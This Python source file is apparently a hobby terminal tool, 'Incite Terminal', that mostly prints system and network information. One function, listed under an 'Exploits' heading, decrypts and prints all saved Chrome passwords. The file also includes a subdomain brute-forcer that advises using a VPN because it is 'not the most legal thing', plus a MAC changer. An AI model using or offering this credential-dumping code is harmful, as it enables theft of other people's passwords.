
# for the programm boot time

import time
start_time = time.time()

# imports
try:

    import socket
    import os
    import psutil
    import time
    import platform
    import sys
    import curses
    import GPUtil
    import datetime
    import shutil
    import fnmatch
    import re
    import subprocess
    import multiprocessing
    import json
    import base64
    import uuid
    import whois
    import getpass
    import keyboard
    import glob

# from imports

    from colorama import Fore, Back, Style, init
    from datetime import datetime, timezone, timedelta, date
    init()                                
    from urllib.request import urlopen 
    from os.path import isfile, join
    from os import listdir
    from requests import get
    from tabulate import tabulate
    from time import sleep
    from os import system, name
    from subprocess import call
except ModuleNotFoundError as startisfucked:
    print(startisfucked)
    print("  ")
    

# variables

uname = platform.uname()
cpufreq = psutil.cpu_freq()
net_io = psutil.net_io_counters()
disk_io = psutil.disk_io_counters()
swap = psutil.swap_memory()
svmem = psutil.virtual_memory()
if_addrs = psutil.net_if_addrs()
host_name = socket.gethostname()
host_ip = socket.gethostbyname(host_name)
gpus = GPUtil.getGPUs()
total, used, free = shutil.disk_usage("/")
ip = get('https://api.ipify.org').text
fullip = "https://api.ipdata.co/"
dirName = 'c:\\'
Data = subprocess.check_output(['wmic', 'process', 'list', 'brief'])
a = str(Data)
boot_time_timestamp = psutil.boot_time()
bt = datetime.fromtimestamp(boot_time_timestamp)
weekNumber = date.today().isocalendar()[1]
currentdir = os.getcwd()
appid = os.getpid()
current_machine_id = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()


# functions

def get_size(bytes, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor

def osinfo():
    print("System Informations")
    print(" ")
    print("User Account Name: ", getpass.getuser())
    print("Current Directory: ", currentdir)
    print("Process ID: ", appid)
    print(f"System: {uname.system}")
    print(f"Node Name: {uname.node}")
    print(f"Release: {uname.release}")
    print(f"Version: {uname.version}")
    print(f"Machine: {uname.machine}")
    print(f"Processor: {uname.processor}")
    if platform.system() == 'Windows':
        print("UUID ID: ",current_machine_id)
    if platform.system() != 'Windows':
        print(" ")
    time.sleep(1)
    start()

def cpuinfo():
    print("Cpu Informations")
    print(" ")
    print(f"Processor: {uname.processor}")
    print("Physical cores:", psutil.cpu_count(logical=False))
    print("Total cores:", psutil.cpu_count(logical=True))
    print(f"Max Frequency: {cpufreq.max:.2f}Mhz")
    print(f"Min Frequency: {cpufreq.min:.2f}Mhz")
    print(f"Current Frequency: {cpufreq.current:.2f}Mhz")
    time.sleep(1)
    start()

def ioinfo():
    print("Total Data send / recieved since boot")
    print("---------------------------------------------------")
    print(f"Total Bytes Sent: {get_size(net_io.bytes_sent)}")
    print(f"Total Bytes Received: {get_size(net_io.bytes_recv)}")
    print(" ")
    print("Total Data read / wrote since boot")
    print("---------------------------------------------------")
    print(f"Total read: {get_size(disk_io.read_bytes)}")
    print(f"Total write: {get_size(disk_io.write_bytes)}")
    time.sleep(1)
    start()

def raminfo():
    print("Random Application Memory Informations")
    print(" ")
    print(f"Total: {get_size(svmem.total)}")
    print(f"Available: {get_size(svmem.available)}")
    print(f"Used: {get_size(svmem.used)}")
    print(f"Percentage: {svmem.percent}%")
    time.sleep(1)
    start()

def info():
    print("Programm Information")
    time.sleep(1)
    print(" ")
    print('Location = ', os.getcwd())
    print('__file__ = ', __file__)
    print("Version = 0.5")
    print("Creator = lubnc4261")
    print("Published on Github = https://github.com/lubnc4261/Incite-Terminal")
    print("Made in Python 3.8.5 32-bit")
    time.sleep(1)
    start()

def currentworld():
    print("System Time = ", datetime.today().strftime("%c"))
    print(" ")
    print ('Week number:', weekNumber)
    time.sleep(1)
    start()

def netinfoall():
    for interface_name, interface_addresses in if_addrs.items():
        for address in interface_addresses:
            print(" ")
            print(f"=== Interface: {interface_name} ===")
            print(" ")
            if str(address.family) == 'AddressFamily.AF_INET':
                print(f"  IP Address: {address.address}")
                print(f"  Netmask: {address.netmask}")
                print(f"  Broadcast IP: {address.broadcast}")
            elif str(address.family) == 'AddressFamily.AF_PACKET':
                print(f"  MAC Address: {address.address}")
                print(f"  Netmask: {address.netmask}")
                print(f"  Broadcast MAC: {address.broadcast}")
    time.sleep(1)
    start()

def netinfo():
    print("Domain Host Name = ", socket.getfqdn())
    print("Local IP = ", host_ip)
    print('Public IP = ', ip)
    time.sleep(1)
    start()

def gpuinfo():
    print("="*40, "GPU Details", "="*40)
    list_gpus = []
    for gpu in gpus:
        gpu_id = gpu.id
        gpu_name = gpu.name
        gpu_load = f"{gpu.load*100}%"
        gpu_free_memory = f"{gpu.memoryFree}MB"
        gpu_used_memory = f"{gpu.memoryUsed}MB"
        gpu_total_memory = f"{gpu.memoryTotal}MB"
        gpu_temperature = f"{gpu.temperature} °C"
        gpu_uuid = gpu.uuid
        list_gpus.append((
            gpu_id, gpu_name, gpu_load, gpu_free_memory, gpu_used_memory,
            gpu_total_memory, gpu_temperature, gpu_uuid
    ))

    print(tabulate(list_gpus, headers=("id", "name", "load", "free memory", "used memory", "total memory",
                                    "temperature", "uuid")))
    time.sleep(1)
    start()

def pcsinfo():
    print("""

    CPU Info = 'cpu'
    RAM Info = 'ram'
    GPU Info = 'gpu'
    
    """)
    time.sleep(1)
    start()

def storage():
    print("Main Storage / OS Installation")
    print(" ")
    print("Total: %d GiB" % (total // (2**30)))
    print("Used: %d GiB" % (used // (2**30)))
    print("Free: %d GiB" % (free // (2**30)))
    time.sleep(1)
    start()

def tasklist():
    def getListOfProcessSortedByMemory():
        listOfProcObjects = []
        for proc in psutil.process_iter():
            try:
                pinfo = proc.as_dict(attrs=['pid', 'name', 'username'])
                pinfo['vms'] = proc.memory_info().vms / (1024 * 1024)
                listOfProcObjects.append(pinfo)
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        listOfProcObjects = sorted(listOfProcObjects, key=lambda procObj: procObj['vms'], reverse=True)
        return listOfProcObjects
    def main():
        print("*** Iterate over all running process and print process ID & Name ***")
        for proc in psutil.process_iter():
            try:
                processName = proc.name()
                processID = proc.pid
                print(processName , ' ::: ', processID)
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        print('*** Create a list of all running processes ***')
        listOfProcessNames = list()
        for proc in psutil.process_iter():
            pInfoDict = proc.as_dict(attrs=['pid', 'name', 'cpu_percent'])
            listOfProcessNames.append(pInfoDict)
        for elem in listOfProcessNames:
            print(elem)
        print('*** Top 5 process with highest memory usage ***')
        listOfRunningProcess = getListOfProcessSortedByMemory()
        for elem in listOfRunningProcess[:5] :
            print(elem)
    if __name__ == '__main__':
        main()
    time.sleep(1)
    start()

def iplookup():
    k = input(" IP to Domain 'ipdomain' \n Domain to IP 'domainip' \n Return 'r' \n ")
    if k == ("domainip"):
        domainip()
    if k == ("ipdomain"):
        ipdomain()
    if k == ("r"):
        start()
    else:
        print(" ")
        print(Fore.RED + "Invalid Returning" + Style.RESET_ALL)
        start()

def ipdomain():
    p = input("Enter IP : ")
    print (socket.getfqdn(p))
    i = input("Again ? 'y' 'n' choice 'c' : ")
    if i == "y":
        ipdomain()
    if i == "n":
        start()
    if i == "c":
        iplookup()
    else:
        print(" ")
        print(Fore.RED + "Invalid Returning" + Style.RESET_ALL)
        start()

def domainip():
    p = input("Enter Domain : ")
    print (socket.gethostbyname(p))
    time.sleep(0.5)
    i = input("Again ? 'y' 'n' choice 'c' : ")
    if i == "y":
        domainip()
    if i == "n":
        start()
    if i == "c":
        iplookup()
    else:
        print(" ")
        print(Fore.RED + "Invalid Returning" + Style.RESET_ALL)
        start()

def helpcmd():
    print("""
      ----------- System -----------

    mass            fast output of everything
    pc              Simple Informations of the pc
    cpu             outputs cpu informations
    io              outputs io informations
    ram             outputs ram informations
    gpu             outputs gpu informations
    storage         outputs storage informations

    tasklist        outputs running tasks informations
    time            outputs the system time
    boot            outputs boot informations

    pyinfo          python related informations

    filedel         delete a file in a directory
    dirdel          deletes a whole directory


      ----------- Network -----------

    net             small overview of the IP
    net /all         every network adapter informations
    iplookup        convert domain to ip or otherwise
    /domain         *
    /ip             *
    mac             shows used mac adress
    pidport         list all ports that are used by a specific Programm (ID)
    mac changer     changes the mac address temporary

      ----------- Internet -----------

    whois           give whois informations for a domain
    web up          checks if website is up
    subdomain       check a website for existing subdomains

      --------Encode / Decode --------

    num to bin      number to binary
    bin to num      binary to number
    str to bin      text to binary
    hex to bin      hexadecimal to binary

      ----------- Exploits ------------

    google pass     shows every saved google chrome password without permissons
    img meta        shows image meta data


      ---------- Directories ---------

    ls              lists every file
    ls ext          lists files with given extension
    cd .            goes 1 directory back
    cd downloads    goes to the download Directory
    cd desktop      goes to the desktop Directory
    cd pictures     goes to the pictures Directory
    cd music        goes to the music Directory

      ----------- Programm -----------

    info            programm informations
    help            this
    cls             clear all recent outputs
    log             get recent activites

    exit            closes the programm 
    
    """)
    time.sleep(1)
    start()

def getmac():
    print ("MAC Adress : ", end="")
    print (':'.join(re.findall('..', '%012x' % uuid.getnode())))
    time.sleep(1)
    start()

def boot():
    print(f"Boot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}")
    print(" ")
    print("For more bootrelated informations use 'io' ")
    time.sleep(1)
    start()

def whoisnet():
    def is_registered(domain_name):
        try:
            w = whois.whois(domain_name)
        except Exception:
            return False
        else:
            return bool(w.domain_name)


    domain_name = input("Enter Domain : ")
    if is_registered(domain_name):
        whois_info = whois.whois(domain_name)
        print("Domain registrar:", whois_info.registrar)
        print(" ")
        print("WHOIS server:", whois_info.whois_server)
        print(" ")
        print("Domain creation date:", whois_info.creation_date)
        print(" ")
        print("Expiration date:", whois_info.expiration_date)
        print(" ")
        print(whois_info)
    time.sleep(1)
    start()

def pyinfo():
    try:
        import distutils.spawn
        if distutils.spawn.find_executable("python.exe"):

            print ('Version      :', platform.python_version())
            print ('Version tuple:', platform.python_version_tuple())
            print ('Compiler     :', platform.python_compiler())
            print ('Build        :', platform.python_build())
            time.sleep(1)
            start()
        else:
            print(Fore.RED + "Python can not get located ")
            time.sleep(1)
            start()
    except Exception:
        print(Fore.RED + "A Error accurred")

def clear():
    try:
        if platform.system() == "Windows":
            os.system("cls")
            time.sleep(1)
            welcomeafterclear()
        if platform.system() == "Linux":
            os.system("clear")
            time.sleep(1)
            welcomeafterclear()
        if platform.system() == "Darwin":
            os.system("clear")
            time.sleep(1)
            welcomeafterclear()
    except Exception as error:
        print(error + Fore.RED + "Clear not possible " + Style.RESET_ALL)
        time.sleep(1)
        start()


def mass():
    print(Fore.BLUE + "System Informations" + Style.RESET_ALL)
    print(Fore.YELLOW + " ")

    print("User Account Name: ", getpass.getuser())
    print("Current Directory: ", currentdir)

    print("Process ID: ", appid)
    print(f"System: {uname.system}")
    print(f"Node Name: {uname.node}")
    print(f"Release: {uname.release}")
    print(f"Version: {uname.version}")
    print(f"Machine: {uname.machine}")
    print(f"Processor: {uname.processor}")
    if platform.system() == 'Windows':
        print("UUID ID: ",current_machine_id)
    if platform.system() != 'Windows':
        print(" ")
    print("")
    print(Fore.BLUE + "Cpu Informations" + Style.RESET_ALL)
    print(Fore.YELLOW + " ")
    print(f"Processor: {uname.processor}")
    print("Physical cores:", psutil.cpu_count(logical=False))
    print("Total cores:", psutil.cpu_count(logical=True))
    print(f"Max Frequency: {cpufreq.max:.2f}Mhz")
    print(f"Min Frequency: {cpufreq.min:.2f}Mhz")
    print(f"Current Frequency: {cpufreq.current:.2f}Mhz")

    print("")
    print(Fore.BLUE + "IO Informations" + Style.RESET_ALL)
    print(Fore.YELLOW + " ")
    print("Total Data send / recieved since boot")
    print("---------------------------------------------------")
    print(f"Total Bytes Sent: {get_size(net_io.bytes_sent)}")
    print(f"Total Bytes Received: {get_size(net_io.bytes_recv)}")
    print(" ")
    print("Total Data read / wrote since boot")
    print("---------------------------------------------------")
    print(f"Total read: {get_size(disk_io.read_bytes)}")
    print(f"Total write: {get_size(disk_io.write_bytes)}")
    print("")

    print(Fore.BLUE + "Random Application Memory Informations" + Style.RESET_ALL)
    print(Fore.YELLOW + " ")
    print(f"Total: {get_size(svmem.total)}")
    print(f"Available: {get_size(svmem.available)}")
    print(f"Used: {get_size(svmem.used)}")
    print(f"Percentage: {svmem.percent}%")
    print("")

    print(Fore.BLUE + "Network Informations" + Style.RESET_ALL)
    print(Fore.YELLOW + " ")
    print("Domain Host Name = ", socket.getfqdn())
    print("Local IP = ", host_ip)
    print('Public IP = ', ip)
    print("")

    print(Fore.BLUE + "GPU Details" + Style.RESET_ALL)
    print(Fore.YELLOW + " ")
    list_gpus = []
    for gpu in gpus:
        gpu_id = gpu.id
        gpu_name = gpu.name
        gpu_load = f"{gpu.load*100}%"
        gpu_free_memory = f"{gpu.memoryFree}MB"
        gpu_used_memory = f"{gpu.memoryUsed}MB"
        gpu_total_memory = f"{gpu.memoryTotal}MB"
        gpu_temperature = f"{gpu.temperature} °C"
        gpu_uuid = gpu.uuid
        list_gpus.append((
            gpu_id, gpu_name, gpu_load, gpu_free_memory, gpu_used_memory,
            gpu_total_memory, gpu_temperature, gpu_uuid
    ))

    print(tabulate(list_gpus, headers=("id", "name", "load", "free memory", "used memory", "total memory",
                                    "temperature", "uuid")))
    print("")

    print(Fore.BLUE + "Main Storage / OS Installation" + Style.RESET_ALL)
    print(Fore.YELLOW + " ")
    print("Total: %d GiB" % (total // (2**30)))
    print("Used: %d GiB" % (used // (2**30)))
    print("Free: %d GiB" % (free // (2**30)))
    print("")

    print(Fore.BLUE + "MAC Adress : ", end="" + Style.RESET_ALL)
    print(Fore.YELLOW + " ")
    print(':'.join(re.findall('..', '%012x' % uuid.getnode())))
    time.sleep(1)
    start()

def pidport():
    print("list all established connections from programms")
    time.sleep(0.4)
    lc = psutil.net_connections('inet')
    for c in lc:
        (ip, port) = c.laddr
        if ip == '0.0.0.0' or ip == '::':
            if c.type == socket.SOCK_STREAM and c.status == psutil.CONN_LISTEN:
                proto_s = 'tcp'
            elif c.type == socket.SOCK_DGRAM:
                proto_s = 'udp'
            else:
                continue
            pid_s = str(c.pid) if c.pid else '(unknown)'
            msg = 'PID {} is listening on port {}/{} for all IPs.'
            msg = msg.format(pid_s, port, proto_s)
            print(msg)
    time.sleep(1)
    start()

def osfiledel():
    file = input("Enter File Name : ")
    location = input ("Enter File Directory : ")

    try:
        path = os.path.join(location, file)
        os.remove(path)
        print("%s has been removed successfully" %file)
        time.sleep(1)
        start()
    except OSError as error:
        print(error)
        print(Fore.RED + "File cannot get removed !")
        time.sleep(1)
        start()

def osdirdel():
    print("This Process may need Administrative Permissions")
    location = input("Enter Path to remove : ")
    try:
        path = os.path.join(location)
        os.remove(path)
        print("%s has been removed successfully" %location)
        time.sleep(1)
        start()
    except OSError as error:
        print(error)
        print(Fore.RED + "File cannot get removed !")
        time.sleep(1)
        start()
    else:
        print(Fore.RED + "A Unkown Error occurred !")

def binnum():    # binary to decimal
    binary_string = input("Enter a binary number :")

    try:
        decimal = int(binary_string,2)  
        print("The decimal value is :", decimal)    
    
    except ValueError:
        print("Invalid binary number")

def numbin():
    n=int(input('please enter the no. in decimal format : '))
    x=n
    k=[]
    while (n>0):
        a=int(float(n%2))
        k.append(a)
        n=(n-a)/2
    k.append(0)
    string=""
    for j in k[::-1]:
        string=string+str(j)
    print('The binary for %d is %s'%(x, string))
    time.sleep(1)
    start()

def strtobin():
    st = input("Enter Text : ")
    try:
        print(' '.join(format(ord(x), 'b') for x in st))
        time.sleep(1)
        start()
    except ValueError:
        print("Invalid Text ")
        time.sleep(1)
        start()

def hextobin():
    import math

    ini_string = input("Enter Hexadecimal : ")
    try:
        n = int(ini_string, 16)  
        bStr = '' 
        while n > 0: 
            bStr = str(n % 2) + bStr 
            n = n >> 1    
        res = bStr 
        print ("Resultant string", str(res))
        time.sleep(1)
        start()
    except ValueError:
        print("Invalid Hexadecimal ")
        time.sleep(1)
        start()

def logopenings():
    f = open("log.txt", "r")
    print(f.read())
    time.sleep(1)
    start()

def openfile():
    try:

        o = input("Enter File Path : ")
        f = open(o , "r")
        print(f.read())
        f.close
        time.sleep(1)
        start()
    except FileNotFoundError as error:
        print(" ")
        print(error)
        time.sleep(1)
        start()

    except MemoryError as oerror:
        print(" ")
        print(oerror)
        print(Fore.RED + "File to big to open / Memory error " + Style.RESET_ALL)
        start()

    except PermissionError as permerror:
        print(" ")
        print(permerror)
        start()

    except UnicodeDecodeError as codeerror:
        print(codeerror)
        start()


def googlepass():
    if platform.system() == "Windows":
        print(" ")
        maingooglepass()
    if platform.system() != "Windows":
        print(Fore.RED + "This is only supported on Windows" + Style.RESET_ALL)
        time.sleep(1)
        start()

def maingooglepass():
    import json
    import win32crypt
    import sqlite3
    import fnmatch
    import base64
    def get_chrome_datetime(chromedate):
        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

    def get_encryption_key():
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Google", "Chrome",
                                        "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_password(password, key):
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
            # not supported
                return ""
    def main():
        key = get_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                "Google", "Chrome", "User Data", "default", "Login Data")
        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]        
            if username or password:
                print(f"Origin URL: {origin_url}")
                print(f"Action URL: {action_url}")
                print(f"Username: {username}")
                print(f"Password: {password}")
            else:
                continue
            if date_created != 86400000000 and date_created:
                print(f"Creation date: {str(get_chrome_datetime(date_created))}")
            if date_last_used != 86400000000 and date_last_used:
                print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
            print("="*50)
        cursor.close()
        db.close()
        try:
            os.remove(filename)
        except:
            pass
    if __name__ == "__main__":
        main()
    time.sleep(1)
    start()

def macchanger():
    if platform.system() == "Linux":
        iface = input("Name of Interface for changing MAC Address: ")
        nmac = input("Type the new MAC Address to be used: ")
        def mchange():
            print("Changing the MAC Address as per the input")
            subprocess.call(["ifconfig", iface, "down"])
            subprocess.call(["ifconfig", iface, "hw", "ether", nmac])
            subprocess.call(["ifconfig", iface, "up"])
            print("MAC Address changed Successfully to: " + nmac)
            time.sleep(1)
            start()
        mchange()
    else:
        print(Fore.RED + "Not supported so far !" + Style.RESET_ALL)
        time.sleep(1)
        start()

def webup():
    import urllib
    try:


        url = input("Enter URL eg. 'https://google.com' : ")
        print(" ")

        status_code = urllib.request.urlopen(url).getcode()
        website_is_up = status_code == 200

        if website_is_up == True:
            print(Fore.GREEN + "Website is up" + Style.RESET_ALL)
        if website_is_up == False:
            print(Fore.YELLOW + "Website is down" + Style.RESET_ALL)

        time.sleep(1)
        start()

    except ValueError:
        print(Fore.RED + "wrong or non existing URL" + Style.RESET_ALL)
        time.sleep(1)
        start()

    except urllib.error.HTTPError as nixgut:
        print(nixgut)
        time.sleep(1)
        start()

def jpgmeta():
    from PIL import Image
    from PIL.ExifTags import TAGS

    imagename = input("Enter Image Path 'only .jpg' : ")
    try:

        image = Image.open(imagename)
        exifdata = image.getexif()
        for tag_id in exifdata:
            tag = TAGS.get(tag_id, tag_id)
            data = exifdata.get(tag_id)
            if isinstance(data, bytes):
                data = data.decode()
            print(f"{tag:25}: {data}")
            time.sleep(1)
            start()
    except PermissionError as error:
        print(error)
        time.sleep(1)
        start()

    except NotADirectoryError as direrror:
        print(direrror)
        start()

    except FileNotFoundError as founderror:
        print(founderror)
        time.sleep(1)
        start()

def osdown():
    os.chdir("..")
    start()

def osdownloads():
    try:
        if platform.system() == "Windows":
            os.chdir("c:\\Users\\" + getpass.getuser() + "\\downloads") # your download folder
            start()
        if platform.system() != "Windows":
            print(Fore.RED + "OS not supported jet !" + Style.RESET_ALL)
            start()

    except FileNotFoundError as error:
        print(error)
        start()

    except NotADirectoryError as direrror:
        print(direrror)
        start()

    except PermissionError as permerror:
        print(permerror)
        start()

def osdesktop():
    try:
        if platform.system() == "Windows":
            os.chdir("c:\\Users\\" + getpass.getuser() + "\\desktop") # your desktop folder
            start()
        if platform.system() != "Windows":
            print(Fore.RED + "OS not supported jet !" + Style.RESET_ALL)
            start()

    except FileNotFoundError as error:
        print(error)
        start()

    except NotADirectoryError as direrror:
        print(direrror)
        start()

    except PermissionError as permerror:
        print(permerror)
        start()

def ospictures():
    try:
        if platform.system() == "Windows":
            os.chdir("c:\\Users\\" + getpass.getuser() + "\\Pictures") # your photo folder
            start()
        if platform.system() != "Windows":
            print(Fore.RED + "OS not supported jet !" + Style.RESET_ALL)
            start()

    except FileNotFoundError as error:
        print(error)
        start()

    except NotADirectoryError as direrror:
        print(direrror)
        start()

    except PermissionError as permerror:
        print(permerror)
        start()

def osmusic():
    try:
        if platform.system() == "Windows":
            os.chdir("c:\\Users\\" + getpass.getuser() + "\\Musik") # your music folder
            start()
        if platform.system() != "Windows":
            print(Fore.RED + "OS not supported jet !" + Style.RESET_ALL)
            start()

    except FileNotFoundError as error:
        print(error)
        start()

    except NotADirectoryError as direrror:
        print(direrror)
        start()

    except PermissionError as permerror:
        print(permerror)
        start()

def osdocuments():
    try:
        if platform.system() == "Windows":
            os.chdir("c:\\Users\\" + getpass.getuser() + "\\Documents") # your music folder
            start()
        if platform.system() != "Windows":
            print(Fore.RED + "OS not supported jet !" + Style.RESET_ALL)
            start()

    except FileNotFoundError as error:
        print(error)
        start()

    except NotADirectoryError as direrror:
        print(direrror)
        start()

    except PermissionError as permerror:
        print(permerror)
        start()

def osls():
    print(os.listdir())
    time.sleep(1)
    start()
    

def lsextended():
    try:
        ls = input("Enter Extension : ")
        arr_txt = [x for x in os.listdir() if x.endswith(ls)]
        print(arr_txt)
        start()

    except FileNotFoundError as error:
        print(error)
        time.sleep(1)
        start()

    except PermissionError as permerror:
        print(permerror)
        start()

def subfinder():
    print("This is not the most legal thing, consider using a vpn")
    ask = input("Do you want to continue ? 'y' 'n': ")
    if ask == 'y':
        import requests
        domain = input ("Enter Website Domain")

        file = open("subdomains.txt", "r")

        content = file.read()
        subdomain = content.splitlines()

        for subdomain in subdomain:
            url = f"http://{subdomain}.{domain}"
            try:
                requests.get(url)
            except requests.ConnectionError:
                pass
            else:
                print("Discovered Subdomain: ", url)
    time.sleep(1)
    start()
    if ask == 'n':
        start()
    else:
        print(Fore.RED + "Invalid answer, returning" + Style.RESET_ALL)

# main             

def start():
    print(Fore.CYAN + " ")
    askstr = ("\n" +  getpass.getuser() + " " + os.getcwd() + " "  r"$ " " ")
    i = input(askstr)
    print(" ")
    #########################################
    ############## keybinds #################




    #########################################
    if i == ("pc"):     # done pc 
        osinfo()
    if i == ("cpu"):    # done cpu 
        cpuinfo()
    if i == ("io"):     # done io 
        ioinfo()
    if i == ("ram"):    # done ram 
        raminfo()
    if i == ("info"):   # done info
        info()
    if i == ("time"):   # done time 
        currentworld()
    #########################################
    if i == ("net /all"):  # done net all 
        netinfoall()
    if i == ("net"):    # done net 
        netinfo()
    #########################################
    if i == ("gpu"):    # done gpu 
        gpuinfo()
    if i == ("pcs info"):  # done pcs info
        pcsinfo()
    if i == ("storage"):  # done storage 
        storage()
    if i == ("tasklist"):  # done tasklist 
        tasklist()
    #########################################
    if i == ("iplookup"):  # done iplookup
        iplookup()
    if i == ("iplookup /domain"): #
        domainip()
    if i == ("iplookup /ip"): #
        ipdomain()
    if i == ("subdomain"): #
        subfinder()
    #########################################
    if i == ("exit"):   # done exit
        exit()
    if i == ("help"):  # done help
        helpcmd()
    if i == ("mac"): # done get mac 
        getmac()
    if i == ("boot"): # done boot info 
        boot()
    if i == ("whois"):  # done whois 
        whoisnet()
    if i == ("cls"): # done clear
        clear()
    if i == ("pyinfo"): # done pyinfo 
        pyinfo()
    if i == ("mass"): # done mass
        mass()
    if i == ("pidport"): # done pidport
        pidport()
    #########################################
    if i == ("filedel"): # done filedel
        osfiledel()
    if i == ("dirdel"): # done dirdel
        osdirdel()
    #########################################
    if i == ("bin to num"): # done
        binnum()
    if i == ("num to bin"): # done
        numbin()
    if i == ("str to bin"): # done
        strtobin()
    if i == ("hex to bin"): # done
        hextobin()
    #########################################
    if i == ("log"): # done
        logopenings()
    if i == ("open"): # done
        openfile()
    if i == ("google pass"): # done
        googlepass()
    if i == ("mac changer"): #
        macchanger()
    if i == ("web up"): #
        webup()
    if i == ("img meta"): #
        jpgmeta()
    #########################################
    if i == ("cd ."): #
        osdown()
    if i == ("cd downloads"): #
        osdownloads()
    if i == ("cd desktop"): #
        osdesktop()
    if i == ("cd pictures"): #
        ospictures()
    if i == ("cd music"): #
        osmusic()
    if i == ("cd documents"):
        osdocuments()
    #########################################
    if i == ("ls"): #
        osls()
    if i == ("ls ext"): #
        lsextended()
    else:
        print("Command wrong or doesn't exist")
        start()


def welcome():
    print(Fore.LIGHTCYAN_EX + r"_________ _        _______ __________________ _______  ")
    print(Fore.LIGHTCYAN_EX + r"\__   __/( (    /|(  ____ \\__   __/\__   __/(  ____ \ ")
    print(Fore.LIGHTCYAN_EX + r"   ) (   |  \  ( || (    \/   ) (      ) (   | (    \/ ")
    print(Fore.LIGHTCYAN_EX + r"   | |   |   \ | || |         | |      | |   | (__     ")
    print(Fore.LIGHTCYAN_EX + r"   | |   | (\ \) || |         | |      | |   |  __)    ")
    print(Fore.LIGHTCYAN_EX + r"   | |   | | \   || |         | |      | |   | (       ")
    print(Fore.LIGHTCYAN_EX + r"___) (___| )  \  || (____/\___) (___   | |   | (____/\ ")
    print(Fore.LIGHTCYAN_EX + r"\_______/|/    )_)(_______/\_______/   )_(   (_______/ ")
    print(Fore.LIGHTCYAN_EX + r"                                                       ")
    if platform.system() == "Windows":
        print(Fore.MAGENTA + "OS : Windows")
    if platform.system() == "Darwin":
        print(Fore.MAGENTA + "OS : Mac")
    if platform.system() == "Linux":
        print(Fore.MAGENTA + "OS : Linux")
    if platform.system() == "Java":
        print(Fore.MAGENTA + "OS : Java")
    print(" ")
    print(" ")
    print(Fore.LIGHTRED_EX + "Python based Command Prompt [Version 0.5]")
    print(Fore.LIGHTRED_EX + "Copyright 2020, lubnc4261, All rights reserved.")
    print(Fore.LIGHTGREEN_EX + "---------------------------------------------------")
    print(Fore.YELLOW + "File: " + __file__)
    print(Fore.LIGHTGREEN_EX + "---------------------------------------------------")
    print(Fore.GREEN + "type " + Fore.YELLOW + "'help'" + Fore.GREEN + " for all commands listed")
    print(Fore.GREEN + "type " + Fore.YELLOW + "'exit'" + Fore.GREEN + " to close the program")
    print(" ")
    print("--- %s seconds to load all modules ---" % (time.time() - start_time))
    start()

def welcomeafterclear():
    print(Fore.LIGHTCYAN_EX + r"_________ _        _______ __________________ _______  ")
    print(Fore.LIGHTCYAN_EX + r"\__   __/( (    /|(  ____ \\__   __/\__   __/(  ____ \ ")
    print(Fore.LIGHTCYAN_EX + r"   ) (   |  \  ( || (    \/   ) (      ) (   | (    \/ ")
    print(Fore.LIGHTCYAN_EX + r"   | |   |   \ | || |         | |      | |   | (__     ")
    print(Fore.LIGHTCYAN_EX + r"   | |   | (\ \) || |         | |      | |   |  __)    ")
    print(Fore.LIGHTCYAN_EX + r"   | |   | | \   || |         | |      | |   | (       ")
    print(Fore.LIGHTCYAN_EX + r"___) (___| )  \  || (____/\___) (___   | |   | (____/\ ")
    print(Fore.LIGHTCYAN_EX + r"\_______/|/    )_)(_______/\_______/   )_(   (_______/ ")
    print(Fore.LIGHTCYAN_EX + r"                                                       ")
    if platform.system() == "Windows":
        print(Fore.MAGENTA + "OS : Windows")
    if platform.system() == "Darwin":
        print(Fore.MAGENTA + "OS : Mac")
    if platform.system() == "Linux":
        print(Fore.MAGENTA + "OS : Linux")
    if platform.system() == "Java":
        print(Fore.MAGENTA + "OS : Java")
    print(" ")
    print(" ")
    print(Fore.LIGHTRED_EX + "Python based Command Prompt [Version 0.5]")
    print(Fore.LIGHTRED_EX + "Copyright 2020, lubnc4261, All rights reserved.")
    print(Fore.LIGHTGREEN_EX + "---------------------------------------------------")
    print(Fore.YELLOW + "File: " + __file__)
    print(Fore.LIGHTGREEN_EX + "---------------------------------------------------")
    print(Fore.GREEN + "type " + Fore.YELLOW + "'help'" + Fore.GREEN + " for all commands listed")
    print(Fore.GREEN + "type " + Fore.YELLOW + "'exit'" + Fore.GREEN + " to close the program")
    print(" ")
    start()

sys.stdout.write("\x1b]2;Incite Terminal v 0.5\x07")
n = datetime.now()
f = open("log.txt", "a")
f.write("Detected Interaction   : %s \n" %n )
f.close()
welcome()
